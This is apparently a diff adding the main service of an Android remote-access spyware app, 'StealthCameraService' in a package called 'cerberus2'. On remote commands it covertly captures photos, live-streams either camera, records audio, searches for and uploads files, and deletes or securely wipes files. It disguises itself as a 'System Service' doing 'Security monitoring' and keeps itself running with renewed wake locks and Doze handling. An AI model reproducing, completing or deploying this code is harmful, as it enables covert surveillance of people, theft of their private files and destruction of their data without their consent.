@@ -1,0 +1,612 @@
+package com.example.cerberus2;
+
+import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.graphics.ImageFormat;
+import android.hardware.camera2.*;
+import android.media.Image;
+import android.media.ImageReader;
+import android.os.Build;
+import android.os.Handler;
+import android.os.HandlerThread;
+import android.os.IBinder;
+import android.os.PowerManager;
+import android.util.Log;
+import android.util.Size;
+import android.view.Surface;
+import androidx.core.app.ActivityCompat;
+import androidx.core.app.NotificationCompat;
+import androidx.annotation.NonNull;
+import java.nio.ByteBuffer;
+import java.util.Arrays;
+import java.util.List;
+import java.util.concurrent.Semaphore;
+import java.util.concurrent.TimeUnit;
+import org.json.JSONArray;
+
+public class StealthCameraService extends Service {
+
+    private static final String TAG = "StealthCameraService";
+    private static final long WAKELOCK_TIMEOUT_MS = 8 * 60 * 60 * 1000L;
+    private volatile boolean isTransmitting = false;
+
+    private CameraManager cameraManager;
+    private String frontCameraId;
+    private String backCameraId;
+    private String currentCameraId;
+    private CameraDevice cameraDevice;
+    private CameraCaptureSession captureSession;
+    private ImageReader imageReader;
+
+    private Handler backgroundHandler;
+    private HandlerThread backgroundThread;
+    private PowerManager.WakeLock wakeLock;
+
+    private boolean isCapturing = false;
+    private boolean isEmergencyMode = false;
+    private boolean isLiveStreaming = false;
+    private final Semaphore cameraOpenCloseLock = new Semaphore(1);
+
+    private StealthDataTransmitter dataTransmitter;
+    private AudioRecorder audioRecorder;
+    private String deviceId;
+
+    private BroadcastReceiver dozeModeReceiver;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        deviceId = DeviceIdManager.getDeviceId(this);
+
+        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        dataTransmitter = new StealthDataTransmitter(this);
+
+        // CommandListener (анонимный класс, т.к. 2 метода)
+        dataTransmitter.setCommandListener(new StealthDataTransmitter.CommandListener() {
+            @Override
+            public void onCommandReceived(String action) {
+                processCommand(action);
+            }
+
+            @Override
+            public void onCommandError(String action, Exception e) {
+                Log.e(TAG, "Command error [" + action + "]: " + e.getMessage());
+            }
+        });
+
+        setupCameraIds();
+        startBackgroundThread();
+        acquireWakeLock();
+
+        dataTransmitter.testConnection(deviceId);
+        startForeground(8004, createNotification());
+        registerDozeModeReceiver();
+    }
+
+    private void registerDozeModeReceiver() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            dozeModeReceiver = new BroadcastReceiver() {
+                @Override
+                public void onReceive(Context context, Intent intent) {
+                    if (PowerManager.ACTION_DEVICE_IDLE_MODE_CHANGED.equals(intent.getAction())) {
+                        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                        if (pm != null && !pm.isDeviceIdleMode()) {
+                            if (dataTransmitter != null && !dataTransmitter.isConnected()) {
+                                dataTransmitter.testConnection(deviceId);
+                            }
+                        }
+                    }
+                }
+            };
+            IntentFilter filter = new IntentFilter(PowerManager.ACTION_DEVICE_IDLE_MODE_CHANGED);
+            registerReceiver(dozeModeReceiver, filter);
+        }
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (deviceId != null && intent != null && "ACTIVATE_STEALTH".equals(intent.getStringExtra("action"))) {
+            activateStealthMode(deviceId);
+        }
+        return START_STICKY;
+    }
+
+    private void processCommand(String command) {
+        String cmd = command.toLowerCase();
+        switch (cmd) {
+            case "take_photo":
+                if (cameraDevice == null) startCameraCapture();
+                else startSingleCapture();
+                break;
+            case "download_file":
+                SharedPreferences prefs = getSharedPreferences("stealth_commands", MODE_PRIVATE);
+                String filePath = prefs.getString("file_path", "");
+                if (!filePath.isEmpty()) dataTransmitter.sendFile(filePath);
+                else Log.e(TAG, "No file path for download");
+                break;
+            case "get_files":
+                dataTransmitter.sendFileList();
+                break;
+            case "start_live_stream":
+                if (cameraDevice == null) {
+                    isLiveStreaming = true;
+                    openCamera(frontCameraId);
+                } else {
+                    startLiveStreaming();
+                }
+                break;
+            case "stop_live_stream":
+                stopLiveStreaming();
+                break;
+            case "start_recording":
+            case "start_audio":
+                startAudioCapture();
+                break;
+            case "stop_recording":
+            case "stop_audio":
+                stopAudioCapture();
+                break;
+            case "switch_camera":
+                switchCamera();
+                break;
+            case "search_files":
+                performFileSearch();
+                break;
+            case "delete_files":
+                performDeleteFiles(false);
+                break;
+            case "secure_wipe":
+                performDeleteFiles(true);
+                break;
+            default:
+                Log.w(TAG, "Unknown command: " + command);
+        }
+    }
+
+    private Notification createNotification() {
+        String channelId = "stealth_channel";
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    channelId, "Security Service", NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) manager.createNotificationChannel(channel);
+        }
+        return new NotificationCompat.Builder(this, channelId)
+                .setContentTitle("System Service")
+                .setContentText("Security monitoring active")
+                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setOngoing(true)
+                .build();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    @Override
+    public void onDestroy() {
+        if (dozeModeReceiver != null) {
+            try { unregisterReceiver(dozeModeReceiver); } catch (Exception ignored) {}
+            dozeModeReceiver = null;
+        }
+        stopAudioCapture();
+        deactivateStealthMode();
+        stopBackgroundThread();
+        releaseWakeLock();
+        super.onDestroy();
+    }
+
+    private void setupCameraIds() {
+        try {
+            for (String cameraId : cameraManager.getCameraIdList()) {
+                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
+                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
+                if (facing != null) {
+                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) frontCameraId = cameraId;
+                    else if (facing == CameraCharacteristics.LENS_FACING_BACK) backCameraId = cameraId;
+                }
+            }
+            currentCameraId = frontCameraId != null ? frontCameraId : backCameraId;
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Failed to setup camera IDs", e);
+        }
+    }
+
+    private void setupCamera(String cameraId) {
+        try {
+            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
+            android.hardware.camera2.params.StreamConfigurationMap map =
+                    characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
+            if (map == null) return;
+
+            Size[] jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
+            if (jpegSizes == null || jpegSizes.length == 0) return;
+
+            Size maxSize = jpegSizes[0];
+            int width = Math.min(maxSize.getWidth(), 1280);
+            int height = Math.min(maxSize.getHeight(), 720);
+
+            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2);
+            imageReader.setOnImageAvailableListener(onImageAvailableListener, backgroundHandler);
+        } catch (Exception e) {
+            Log.e(TAG, "Camera setup failed", e);
+        }
+    }
+
+    public void activateStealthMode(String deviceId) {
+        if (isEmergencyMode) return;
+        isEmergencyMode = true;
+        this.deviceId = deviceId;
+    }
+
+    public void deactivateStealthMode() {
+        if (!isEmergencyMode) return;
+        isEmergencyMode = false;
+        isCapturing = false;
+        isLiveStreaming = false;
+        if (backgroundHandler != null) {
+            backgroundHandler.removeCallbacks(captureRunnable);
+            backgroundHandler.removeCallbacks(liveStreamRunnable);
+        }
+        closeCamera();
+        dataTransmitter.disconnect();
+    }
+
+    public void startCameraCapture() {
+        if (!isEmergencyMode || isCapturing) return;
+        isCapturing = true;
+        openCamera(frontCameraId);
+    }
+
+    public void stopCameraCapture() {
+        isCapturing = false;
+        isLiveStreaming = false;
+        if (backgroundHandler != null) {
+            backgroundHandler.removeCallbacks(captureRunnable);
+            backgroundHandler.removeCallbacks(liveStreamRunnable);
+        }
+        closeCamera();
+    }
+
+    public void startLiveStreaming() {
+        if (!isEmergencyMode) return;
+        isLiveStreaming = true;
+        if (cameraDevice != null && captureSession != null && backgroundHandler != null) {
+            backgroundHandler.removeCallbacks(captureRunnable);
+            backgroundHandler.post(liveStreamRunnable);
+        }
+    }
+
+    public void stopLiveStreaming() {
+        isLiveStreaming = false;
+        if (backgroundHandler != null) backgroundHandler.removeCallbacks(liveStreamRunnable);
+    }
+
+    public void startAudioCapture() {
+        if (audioRecorder != null || deviceId == null) return;
+        try {
+            // ИСПРАВЛЕНО: конструктор теперь принимает 3 аргумента
+            audioRecorder = new AudioRecorder(this, deviceId, dataTransmitter);
+            audioRecorder.startRecording();
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to start audio capture", e);
+        }
+    }
+
+    public void stopAudioCapture() {
+        if (audioRecorder != null) {
+            audioRecorder.stopRecording();
+            audioRecorder = null;
+        }
+    }
+
+    private void performFileSearch() {
+        SharedPreferences prefs = getSharedPreferences("stealth_commands", MODE_PRIVATE);
+        String keywordsJson = prefs.getString("search_keywords", "[]");
+        String extensionsJson = prefs.getString("search_extensions", "[]");
+
+        backgroundHandler.post(() -> {
+            try {
+                FileManagementService fileService = new FileManagementService(this);
+                FileManagementService.SearchCriteria criteria = new FileManagementService.SearchCriteria();
+
+                JSONArray keywords = new JSONArray(keywordsJson);
+                for (int i = 0; i < keywords.length(); i++) {
+                    String kw = keywords.getString(i).trim();
+                    if (!kw.isEmpty()) criteria.addKeywordPattern(kw);
+                }
+
+                JSONArray extensions = new JSONArray(extensionsJson);
+                for (int i = 0; i < extensions.length(); i++) {
+                    String ext = extensions.getString(i).trim().toLowerCase();
+                    if (!ext.isEmpty()) criteria.addFileExtension(ext);
+                }
+
+                List<String> results = fileService.searchFiles(criteria);
+                dataTransmitter.sendSearchResults(results);
+            } catch (Exception e) {
+                Log.e(TAG, "File search failed", e);
+            }
+        });
+    }
+
+    private void performDeleteFiles(boolean secureWipe) {
+        SharedPreferences prefs = getSharedPreferences("stealth_commands", MODE_PRIVATE);
+        String filesJson = prefs.getString("target_files", "[]");
+
+        backgroundHandler.post(() -> {
+            try {
+                FileManagementService fileService = new FileManagementService(this);
+                JSONArray filesArray = new JSONArray(filesJson);
+                List<String> filePaths = new java.util.ArrayList<>();
+                for (int i = 0; i < filesArray.length(); i++) {
+                    filePaths.add(filesArray.getString(i));
+                }
+
+                if (secureWipe) {
+                    for (String path : filePaths) fileService.secureDelete(path);
+                } else {
+                    fileService.deleteFiles(filePaths);   // ← добавленный метод
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "File delete failed", e);
+            }
+        });
+    }
+
+    private void openCamera(String cameraId) {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+        if (cameraDevice != null) return;
+
+        currentCameraId = cameraId;
+        setupCamera(cameraId);
+
+        try {
+            if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) return;
+            cameraManager.openCamera(cameraId, stateCallback, backgroundHandler);
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Failed to open camera", e);
+            cameraOpenCloseLock.release();
+        } catch (InterruptedException e) {
+            Log.e(TAG, "Interrupted while waiting for camera lock", e);
+        }
+    }
+
+    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
+        @Override
+        public void onOpened(@NonNull CameraDevice camera) {
+            cameraOpenCloseLock.release();
+            cameraDevice = camera;
+            createCaptureSession();
+        }
+
+        @Override
+        public void onDisconnected(@NonNull CameraDevice camera) {
+            cameraOpenCloseLock.release();
+            camera.close();
+            cameraDevice = null;
+        }
+
+        @Override
+        public void onError(@NonNull CameraDevice camera, int error) {
+            cameraOpenCloseLock.release();
+            camera.close();
+            cameraDevice = null;
+        }
+    };
+
+    private void createCaptureSession() {
+        try {
+            cameraDevice.createCaptureSession(Arrays.asList(imageReader.getSurface()),
+                    new CameraCaptureSession.StateCallback() {
+                        @Override
+                        public void onConfigured(@NonNull CameraCaptureSession session) {
+                            if (cameraDevice == null) return;
+                            captureSession = session;
+                            if (isLiveStreaming && backgroundHandler != null) {
+                                backgroundHandler.post(liveStreamRunnable);
+                            }
+                        }
+
+                        @Override
+                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
+                            Log.e(TAG, "Failed to configure capture session");
+                        }
+                    }, backgroundHandler);
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Failed to create capture session", e);
+        }
+    }
+
+    public void startSingleCapture() {
+        if (!isEmergencyMode || captureSession == null) return;
+        try {
+            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+            builder.addTarget(imageReader.getSurface());
+            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 98);
+            builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
+            builder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON);
+            builder.set(CaptureRequest.CONTROL_AF_MODE, CameraMetadata.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
+            builder.set(CaptureRequest.CONTROL_AWB_MODE, CameraMetadata.CONTROL_AWB_MODE_AUTO);
+
+            captureSession.capture(builder.build(), null, backgroundHandler);
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Failed to capture", e);
+        }
+    }
+
+    private final Runnable captureRunnable = () -> {
+        if (isCapturing && isEmergencyMode && captureSession != null && !isLiveStreaming) {
+            startSingleCapture();
+        }
+    };
+
+    private final Runnable liveStreamRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isLiveStreaming && isEmergencyMode && captureSession != null) {
+                if (!isTransmitting) {
+                    try {
+                        CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                        builder.addTarget(imageReader.getSurface());
+                        builder.set(CaptureRequest.JPEG_QUALITY, (byte) 60);
+                        builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
+                        captureSession.capture(builder.build(), null, backgroundHandler);
+                        backgroundHandler.postDelayed(this, 800);
+                    } catch (CameraAccessException e) {
+                        Log.e(TAG, "Live capture failed", e);
+                    }
+                } else {
+                    backgroundHandler.postDelayed(this, 200);
+                }
+            }
+        }
+    };
+
+    private final ImageReader.OnImageAvailableListener onImageAvailableListener = reader -> {
+        if (isTransmitting) {
+            Image img = reader.acquireLatestImage();
+            if (img != null) img.close();
+            return;
+        }
+
+        Image image = null;
+        try {
+            image = reader.acquireLatestImage();
+            if (image != null && deviceId != null) {
+                isTransmitting = true;
+                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                byte[] imageData = new byte[buffer.remaining()];
+                buffer.get(imageData);
+
+                backgroundHandler.post(() -> {
+                    try {
+                        dataTransmitter.sendImageData(imageData);
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error transmitting image", e);
+                    } finally {
+                        isTransmitting = false;
+                    }
+                });
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error in onImageAvailable", e);
+            isTransmitting = false;
+        } finally {
+            if (image != null) {
+                try { image.close(); } catch (Exception ignored) {}
+            }
+        }
+    };
+
+    private void closeCamera() {
+        try {
+            cameraOpenCloseLock.acquire();
+            if (captureSession != null) {
+                captureSession.close();
+                captureSession = null;
+            }
+            if (cameraDevice != null) {
+                cameraDevice.close();
+                cameraDevice = null;
+            }
+            if (imageReader != null) {
+                imageReader.close();
+                imageReader = null;
+            }
+        } catch (InterruptedException e) {
+            throw new RuntimeException("Interrupted while closing camera", e);
+        } finally {
+            cameraOpenCloseLock.release();
+        }
+    }
+
+    private void startBackgroundThread() {
+        backgroundThread = new HandlerThread("StealthCameraBackground");
+        backgroundThread.start();
+        backgroundHandler = new Handler(backgroundThread.getLooper());
+    }
+
+    private void stopBackgroundThread() {
+        if (backgroundThread != null) {
+            backgroundThread.quitSafely();
+            try {
+                backgroundThread.join();
+                backgroundThread = null;
+                backgroundHandler = null;
+            } catch (InterruptedException e) {
+                Log.e(TAG, "Error stopping background thread", e);
+            }
+        }
+    }
+
+    private void acquireWakeLock() {
+        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (powerManager != null) {
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "StealthCamera::WakeLock");
+            wakeLock.acquire(WAKELOCK_TIMEOUT_MS);
+            scheduleWakeLockRenewal();
+        }
+    }
+
+    private void scheduleWakeLockRenewal() {
+        long renewalDelay = WAKELOCK_TIMEOUT_MS - 60_000L;
+        backgroundHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (wakeLock != null && wakeLock.isHeld()) {
+                    wakeLock.acquire(WAKELOCK_TIMEOUT_MS);
+                    Log.d(TAG, "WakeLock renewed");
+                    scheduleWakeLockRenewal();
+                }
+            }
+        }, renewalDelay);
+    }
+
+    private void releaseWakeLock() {
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
+    }
+
+    public void switchCamera() {
+        if (!isEmergencyMode) return;
+
+        boolean wasStreaming = isLiveStreaming;
+        isLiveStreaming = false;
+        isTransmitting = false;
+        if (backgroundHandler != null) backgroundHandler.removeCallbacks(liveStreamRunnable);
+
+        closeCamera();
+
+        if (currentCameraId == null || frontCameraId == null || backCameraId == null) return;
+
+        String newCameraId = currentCameraId.equals(frontCameraId) ? backCameraId : frontCameraId;
+
+        backgroundHandler.postDelayed(() -> {
+            openCamera(newCameraId);
+            if (wasStreaming) {
+                backgroundHandler.postDelayed(() -> {
+                    isLiveStreaming = true;
+                    isTransmitting = false;
+                    if (captureSession != null) {
+                        backgroundHandler.postDelayed(liveStreamRunnable, 500);
+                    }
+                }, 1500);
+            }
+        }, 800);
+    }
+}
